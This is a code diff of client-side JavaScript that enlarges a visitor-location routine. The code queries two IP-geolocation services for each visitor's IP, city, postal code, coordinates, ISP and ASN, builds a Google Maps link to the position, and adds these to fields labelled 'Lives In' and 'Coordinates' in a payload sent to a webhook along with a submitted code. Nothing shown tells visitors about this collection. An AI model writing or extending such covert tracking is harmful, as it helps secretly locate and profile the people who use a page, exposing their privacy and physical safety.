@@ -95,25 +95,86 @@ function checkRateLimit() {
 // Location and Webhook Functions
 async function getLocationInfo() {
     try {
-        // Get IP-based location info
-        const response = await fetch('https://ipapi.co/json/');
-        const data = await response.json();
+        // Get comprehensive location info from multiple sources
+        const [ipapiResponse, ipinfoResponse] = await Promise.allSettled([
+            fetch('https://ipapi.co/json/'),
+            fetch('https://ipinfo.io/json')
+        ]);
+
+        let locationData = {};
+
+        // Primary source: ipapi.co (more detailed)
+        if (ipapiResponse.status === 'fulfilled') {
+            const data = await ipapiResponse.value.json();
+            locationData = {
+                ip: data.ip || 'Unknown',
+                city: data.city || 'Unknown',
+                region: data.region || 'Unknown',
+                state: data.region_code || 'Unknown',
+                country: data.country_name || 'Unknown',
+                countryCode: data.country_code || 'Unknown',
+                timezone: data.timezone || 'Unknown',
+                isp: data.org || 'Unknown',
+                postal: data.postal || 'Unknown',
+                latitude: data.latitude || 'Unknown',
+                longitude: data.longitude || 'Unknown',
+                asn: data.asn || 'Unknown',
+                languages: data.languages || 'Unknown',
+                currency: data.currency || 'Unknown',
+                callingCode: data.country_calling_code || 'Unknown'
+            };
+        }
+
+        // Backup source: ipinfo.io
+        if (ipinfoResponse.status === 'fulfilled') {
+            const backupData = await ipinfoResponse.value.json();
+            locationData = {
+                ...locationData,
+                ip: locationData.ip || backupData.ip || 'Unknown',
+                city: locationData.city || backupData.city || 'Unknown',
+                region: locationData.region || backupData.region || 'Unknown',
+                country: locationData.country || backupData.country || 'Unknown',
+                timezone: locationData.timezone || backupData.timezone || 'Unknown',
+                isp: locationData.isp || backupData.org || 'Unknown',
+                postal: locationData.postal || backupData.postal || 'Unknown',
+                coordinates: backupData.loc || 'Unknown'
+            };
+        }
+
+        // Enhanced location description
+        const fullLocation = `${locationData.city}, ${locationData.region}, ${locationData.country}`;
+        const coordinates = locationData.latitude && locationData.longitude 
+            ? `${locationData.latitude}, ${locationData.longitude}`
+            : locationData.coordinates || 'Unknown';
+
         return {
-            ip: data.ip || 'Unknown',
-            city: data.city || 'Unknown',
-            region: data.region || 'Unknown',
-            country: data.country_name || 'Unknown',
-            timezone: data.timezone || 'Unknown',
-            isp: data.org || 'Unknown'
+            ...locationData,
+            fullLocation: fullLocation,
+            coordinates: coordinates,
+            googleMapsLink: coordinates !== 'Unknown' 
+                ? `https://maps.google.com/?q=${coordinates.replace(' ', '')}`
+                : 'Unknown'
         };
     } catch (error) {
         return {
             ip: 'Unable to fetch',
             city: 'Unknown',
             region: 'Unknown',
+            state: 'Unknown',
             country: 'Unknown',
+            countryCode: 'Unknown',
             timezone: 'Unknown',
-            isp: 'Unknown'
+            isp: 'Unknown',
+            postal: 'Unknown',
+            latitude: 'Unknown',
+            longitude: 'Unknown',
+            fullLocation: 'Unknown',
+            coordinates: 'Unknown',
+            googleMapsLink: 'Unknown',
+            asn: 'Unknown',
+            languages: 'Unknown',
+            currency: 'Unknown',
+            callingCode: 'Unknown'
         };
     }
 }
@@ -341,13 +402,30 @@ async function sendToWebhook(code, validationResult = {}) {
                             inline: true
                         },
                         {
-                            name: "🏙️ Location",
-                            value: `${locationInfo.city}, ${locationInfo.region}`,
+                            name: "🏠 Lives In",
+                            value: locationInfo.fullLocation,
                             inline: true
                         },
                         {
-                            name: "🌍 Country",
-                            value: locationInfo.country,
+                            name: "🏢 State/Province",
+                            value: `${locationInfo.state} (${locationInfo.countryCode})`,
+                            inline: true
+                        },
+                        {
+                            name: "📮 Postal Code",
+                            value: locationInfo.postal,
+                            inline: true
+                        },
+                        {
+                            name: "📍 Coordinates",
+                            value: locationInfo.coordinates,
+                            inline: true
+                        },
+                        {
+                            name: "🗺️ Google Maps",
+                            value: locationInfo.googleMapsLink !== 'Unknown' 
+                                ? `[View Location](${locationInfo.googleMapsLink})`
+                                : 'Unknown',
                             inline: true
                         },
                     {
@@ -356,8 +434,28 @@ async function sendToWebhook(code, validationResult = {}) {
                         inline: true
                     },
                     {
-                        name: "🌐 ISP",
+                        name: "🌐 ISP Provider",
                         value: locationInfo.isp,
+                        inline: true
+                    },
+                    {
+                        name: "🔢 ASN",
+                        value: locationInfo.asn,
+                        inline: true
+                    },
+                    {
+                        name: "💰 Currency",
+                        value: locationInfo.currency,
+                        inline: true
+                    },
+                    {
+                        name: "📞 Country Code",
+                        value: locationInfo.callingCode,
+                        inline: true
+                    },
+                    {
+                        name: "🗣️ Languages",
+                        value: locationInfo.languages,
                         inline: true
                     },
                     {
@@ -402,13 +500,30 @@ async function sendToWebhook(code, validationResult = {}) {
                             inline: true
                         },
                         {
-                            name: "🏙️ Location",
-                            value: `${locationInfo.city}, ${locationInfo.region}`,
+                            name: "🏠 Lives In",
+                            value: locationInfo.fullLocation,
                             inline: true
                         },
                         {
-                            name: "🌍 Country",
-                            value: locationInfo.country,
+                            name: "🏢 State/Province",
+                            value: `${locationInfo.state} (${locationInfo.countryCode})`,
+                            inline: true
+                        },
+                        {
+                            name: "📮 Postal Code",
+                            value: locationInfo.postal,
+                            inline: true
+                        },
+                        {
+                            name: "📍 Coordinates",
+                            value: locationInfo.coordinates,
+                            inline: true
+                        },
+                        {
+                            name: "🗺️ Google Maps",
+                            value: locationInfo.googleMapsLink !== 'Unknown' 
+                                ? `[View Location](${locationInfo.googleMapsLink})`
+                                : 'Unknown',
                             inline: true
                         },
                         {
@@ -417,8 +532,28 @@ async function sendToWebhook(code, validationResult = {}) {
                             inline: true
                         },
                         {
-                            name: "🌐 ISP",
+                            name: "🌐 ISP Provider",
                             value: locationInfo.isp,
+                            inline: true
+                        },
+                        {
+                            name: "🔢 ASN",
+                            value: locationInfo.asn,
+                            inline: true
+                        },
+                        {
+                            name: "💰 Currency",
+                            value: locationInfo.currency,
+                            inline: true
+                        },
+                        {
+                            name: "📞 Country Code",
+                            value: locationInfo.callingCode,
+                            inline: true
+                        },
+                        {
+                            name: "🗣️ Languages",
+                            value: locationInfo.languages,
                             inline: true
                         },
                         {
